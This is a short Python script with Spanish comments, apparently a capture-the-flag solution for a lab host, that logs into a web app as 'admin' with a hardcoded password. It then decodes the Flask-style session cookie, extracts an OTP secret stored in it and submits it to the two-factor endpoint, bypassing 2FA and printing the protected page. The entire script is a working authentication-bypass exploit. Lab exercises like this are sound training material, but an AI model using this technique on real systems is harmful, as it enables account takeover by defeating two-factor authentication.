import requests
import base64
import json
import zlib
import sys

BASE_URL = "http://chatelaine.cylabacademy.net:45349"

s = requests.Session()

# 1. Login como admin
print("[*] Iniciando sesión como admin...", flush=True)
r = s.post(f"{BASE_URL}/login", data={
    "username": "admin",
    "password": "apple@123"
}, allow_redirects=True)

print(f"Status tras login: {r.status_code}, URL: {r.url}", flush=True)
cookie = s.cookies.get("session")
print(f"Cookie obtenida: {cookie}", flush=True)

if cookie:
    payload_part = cookie.split('.')[0]
    payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
    raw = base64.urlsafe_b64decode(payload_part)
    if raw.startswith(b'.'):
        raw = zlib.decompress(raw[1:])
    data = json.loads(raw.decode('utf-8'))
    print(f"[+] Contenido decodificado de la sesión: {data}", flush=True)
    
    otp = data.get("otp_secret")
    print(f"[+] OTP Extraído: {otp}", flush=True)
    
    # Enviar OTP
    r2 = s.post(f"{BASE_URL}/two_fa", data={"otp": otp}, allow_redirects=True)
    print(f"Status tras enviar OTP: {r2.status_code}, URL: {r2.url}", flush=True)
    print("\n[+] CONTENIDO FINAL:")
    print(r2.text, flush=True)
